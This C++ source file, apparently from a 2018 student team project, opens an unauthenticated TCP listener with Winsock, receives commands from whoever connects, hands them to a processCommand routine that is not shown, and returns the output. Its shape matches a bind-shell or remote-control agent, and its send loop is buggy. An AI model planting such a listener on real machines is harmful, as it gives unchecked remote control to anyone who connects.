//Team Project Smith, Kreiser, Graham
//August 22, 2018

#include "client.h"

int __cdecl main(void)
{
	WSADATA wsaData;
	int iResult;

	//Sets the socket needed for the connection
	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ServerSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;


	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		std::cout << "WSAStartup failed with error: " << iResult << std::endl;
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0)
	{
		std::cout << "getaddrinfo failed with error: " << iResult << std::endl;
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET)
	{
		std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR)
	{
		std::cout << "bind failed with error: " << WSAGetLastError() << std::endl;
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);
	// Accepts a listener socket
	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR)
	{
		std::cout << "listen failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// Accept a client socket
	ServerSocket = accept(ListenSocket, NULL, NULL);
	if (ServerSocket == INVALID_SOCKET)
	{
		std::cout << "accept failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	std::stringstream output;
	// No longer need listening socket
	closesocket(ListenSocket);
	// Receive until the peer shuts down the connection
	do {
		std::vector<char> inputBuffer(5000);
		std::vector<char> outputBuffer;
		//Receives any incoming buffers from the server
		iResult = recv(ServerSocket, inputBuffer.data(), inputBuffer.size(), 0);
		//std::cout << "Data has been received." << std::endl;
		//If the result is not -1, then resize inputBuffer to make sure that it can hold the bytes incoming
		if (iResult != -1)
		{
			inputBuffer.resize(iResult);
		}
		//If the result is not 0, information was pulled and can be processed
		if (iResult != 0)
		{
			//Central function that handles switch/cases for all the commands
			//std::string directory = setDriveLetter();
			processCommand(inputBuffer, outputBuffer);
			std::cout << std::endl;
			char newbuffer[4096 * 2];
			//If the command asks for a result (at this stage, all will), the result needs to be sent back 
			//to the server
			for (int i = 0; i < outputBuffer.size(); i++)
			{
				newbuffer[i % sizeof(newbuffer)] = outputBuffer[i];
				if ((i % sizeof(newbuffer)) == 0 && i != 0)
				{
					std::cout << newbuffer << std::endl;
					iResult = send(ServerSocket, newbuffer, sizeof(newbuffer), 0);
				}
			}
			iResult = send(ServerSocket, newbuffer, sizeof(newbuffer), 0);
			char end = 0;
			iResult = send(ServerSocket, &end, sizeof(end), 0);
		}
		//If 0 bytes has been sent, then the server has shutdown and so should the client
		else
		{
			break;
		}
		outputBuffer.clear();
	} while (true);

	// shutdown the connection since we're done
	iResult = shutdown(ServerSocket, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		std::cout << "shutdown failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ServerSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(ServerSocket);
	WSACleanup();
	return 0;
}



